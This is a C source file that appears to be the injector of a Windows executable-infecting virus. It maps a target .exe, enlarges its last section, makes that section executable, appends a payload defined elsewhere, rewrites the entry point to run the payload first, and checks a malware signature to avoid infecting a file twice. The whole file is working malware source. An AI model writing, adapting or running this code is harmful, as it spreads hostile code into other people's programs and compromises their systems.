#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include "payload.h"
#include "utils.h"

EXTERN_C_START
extern CONST VOID payload();
extern LONGLONG delta_start;
extern LONGLONG to_c_code;
extern CONST DWORD signature;
extern DWORD code_size;
EXTERN_C_END

VOID InjectPayload(IN CONST PIMAGE_DOS_HEADER pDosHeader, IN CONST PCBYTE pPayload,
                   IN CONST DWORD dwPayloadSize) {
    PIMAGE_NT_HEADERS64 pNtHeader;
    PIMAGE_SECTION_HEADER pSection, pLastSection;
    WORD wNbSections;
    DWORD dwFileAlignment, dwLastSectionPtr, dwLastSectionSize, dwPayloadPtr, dwOrigEntryPoint,
        dwNewEntryPoint, dwSignature;

    pNtHeader = (PIMAGE_NT_HEADERS64)((PBYTE)pDosHeader + pDosHeader->e_lfanew);
    wNbSections = pNtHeader->FileHeader.NumberOfSections;
    pSection = IMAGE_FIRST_SECTION(pNtHeader);
    dwFileAlignment = pNtHeader->OptionalHeader.FileAlignment;
    printf("File alignment: %#lx (%lu)\n", dwFileAlignment, dwFileAlignment);

    pLastSection = &pSection[wNbSections - 1];
    dwLastSectionPtr = pLastSection->PointerToRawData;
    dwLastSectionSize = pLastSection->SizeOfRawData;
    dwPayloadPtr = dwLastSectionPtr + dwLastSectionSize;
    dwOrigEntryPoint = pNtHeader->OptionalHeader.AddressOfEntryPoint;
    printf("Entry point: %#010lx\n", dwOrigEntryPoint);
    printf("Last section: %s\n", pLastSection->Name);
    printf("Last section pointer: %#010lx\n", dwLastSectionPtr);
    printf("Last section raw size: %#lx (%lu)\n", dwLastSectionSize, dwLastSectionSize);
    printf("Last section virtsize: %#lx (%lu)\n", pLastSection->Misc.VirtualSize,
           pLastSection->Misc.VirtualSize);
    printf("Size of code: %lu\n", pNtHeader->OptionalHeader.SizeOfCode);

    dwSignature = *(PCDWORD)((PCBYTE)pDosHeader + dwPayloadPtr -
                             ((PCBYTE)&code_size - (PCBYTE)&signature + sizeof(code_size)));
    printf("\nMalware signature: %#010lx\n\n", dwSignature);

    if (dwSignature == signature) {
        printf("Payload already injected!\n");
        return;
    }

    pLastSection->Misc.VirtualSize += dwPayloadSize;
    // DWORD dwNewSize = PAGE_ALIGN(pLastSection->Misc.VirtualSize, dwFileAlignment);
    // printf("New size: %#lx (%lu)\n", dwNewSize, dwNewSize);
    pLastSection->SizeOfRawData += dwPayloadSize;
    pNtHeader->OptionalHeader.SizeOfCode += dwPayloadSize;
    pLastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE;
    printf("New raw size: %#lx (%lu)\n", pLastSection->SizeOfRawData, pLastSection->SizeOfRawData);
    printf("New virtsize: %#lx (%lu)\n", pLastSection->Misc.VirtualSize,
           pLastSection->Misc.VirtualSize);
    printf("New size of code: %lu\n", pNtHeader->OptionalHeader.SizeOfCode);

    dwNewEntryPoint = pLastSection->VirtualAddress + dwLastSectionSize;
    pNtHeader->OptionalHeader.AddressOfEntryPoint = dwNewEntryPoint;
    printf("New entry point: %#010lx\n", dwNewEntryPoint);

    DWORD dwOldProtect;
    VirtualProtect(&delta_start, sizeof(delta_start), PAGE_READWRITE, &dwOldProtect);
    delta_start = (LONGLONG)dwOrigEntryPoint - (LONGLONG)dwNewEntryPoint;
    VirtualProtect(&delta_start, sizeof(delta_start), dwOldProtect, &dwOldProtect);
    printf("delta_start: %#018llx (%lld)\n", delta_start, delta_start);

    printf("New payload:\n");
    HexDump(pPayload, dwPayloadSize);

    memcpy((PBYTE)pDosHeader + dwPayloadPtr, pPayload, dwPayloadSize);
}

int main(int argc, char* argv[]) {
    int ret = 0;
    HANDLE hFile, hMapFile;
    LPVOID pMapAddress;
    DWORD dwFileSize, dwPayloadSize;
    ULARGE_INTEGER uliSize, uliOffset;

    dwPayloadSize = (DWORD)((PCBYTE)&code_size - (PCBYTE)&payload + sizeof(code_size));
    printf("Payload size: %lu\n", dwPayloadSize);
    printf("Payload: %p\n", &payload);
    // HexDump((PCBYTE)&payload, dwPayloadSize);

    if (argc < 2) {
        fprintf(stderr, "Usage: %s <filename.exe>\n", argv[0]);
        ret = 1;
        goto exit;
    }

    printf("Reading file: %s\n", argv[1]);

    hFile = CreateFile(argv[1], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                       FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        PrintError("CreateFile");
        ret = 1;
        goto exit;
    }

    dwFileSize = GetFileSize(hFile, NULL);
    printf("File size: %lu bytes\n", dwFileSize);
    DWQUAD(uliSize) = dwFileSize + dwPayloadSize;

    hMapFile = CreateFileMapping(hFile, NULL, PAGE_READWRITE, DWHILO(uliSize), NULL);
    if (hMapFile == NULL) {
        PrintError("CreateFileMapping");
        ret = 1;
        goto close_file;
    }

    DWQUAD(uliOffset) = 0;
    pMapAddress = MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, DWHILO(uliOffset), 0);
    if (pMapAddress == NULL) {
        PrintError("MapViewOfFile");
        ret = 1;
        goto close_map;
    }

    DWORD dwOldProtect;
    VirtualProtect(&code_size, sizeof(code_size), PAGE_READWRITE, &dwOldProtect);
    code_size = dwPayloadSize;
    VirtualProtect(&code_size, sizeof(code_size), dwOldProtect, &dwOldProtect);

    VirtualProtect(&to_c_code, sizeof(to_c_code), PAGE_READWRITE, &dwOldProtect);
    to_c_code = (PCBYTE)&inj_code_c - (PCBYTE)&payload;
    VirtualProtect(&to_c_code, sizeof(to_c_code), dwOldProtect, &dwOldProtect);

    printf("[*] Injecting payload...\n");
    InjectPayload((PIMAGE_DOS_HEADER)pMapAddress, (PCBYTE)&payload, dwPayloadSize);
    printf("[*] Injection complete!\n");

    FlushViewOfFile(pMapAddress, 0);
    UnmapViewOfFile(pMapAddress);
    FlushFileBuffers(hFile);
close_map:
    CloseHandle(hMapFile);
close_file:
    CloseHandle(hFile);
exit:
    return ret;
}
